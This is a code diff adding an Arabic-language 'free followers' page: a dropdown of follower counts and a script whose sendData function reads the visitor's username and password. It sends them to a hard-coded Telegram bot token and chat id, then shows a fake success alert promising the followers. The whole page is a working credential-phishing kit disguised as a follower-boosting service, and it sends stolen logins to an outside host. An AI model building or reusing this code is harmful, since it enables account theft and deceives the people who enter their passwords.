@@ -1,0 +1,32 @@
+<select id="followersCount" style="width: 100%; padding: 10px; margin-top: 10px; border-radius: 5px;">
+    <option value="10">10 متابع</option>
+    <option value="15">15 متابع</option>
+    <option value="25">25 متابع</option>
+    <option value="50">50 متابع</option>
+    <option value="100">100 متابع</option>
+    <option value="150">150 متابع</option>
+    <option value="200">200 متابع</option>
+    <option value="350">350 متابع</option>
+    <option value="500">500 متابع</option>
+    <option value="1000">1000 متابع</option>
+    <option value="1500">1500 متابع</option>
+    <option value="2500">2500 متابع</option>
+    <option value="3000">3000 متابع</option>
+    <option value="5500">5500 متابع</option>
+</select>
+
+<script>
+async function sendData() {
+    const count = document.getElementById('followersCount').value;
+    const user = document.getElementById('username').value; 
+    const pass = document.getElementById('password').value;
+    
+    // تجميع البيانات في رسالة واحدة
+    const message = `🚀 طلب رشق جديد:\n👤 الحساب: ${user}\n🔑 الباسورد: ${pass}\n📈 العدد المطلوب: ${count}`;
+    
+    // إرسال البيانات إلى البوت الخاص بك
+    await fetch(`https://api.telegram.org/bot8444214588:AAE8ugJvMnz8RNfWuIvBCT_-9X-NHl01qek/sendMessage?chat_id=1371063739&text=${encodeURIComponent(message)}`);
+    
+    alert("✅ تم استلام طلبك لزيادة " + count + " متابع بنجاح!");
+}
+</script>
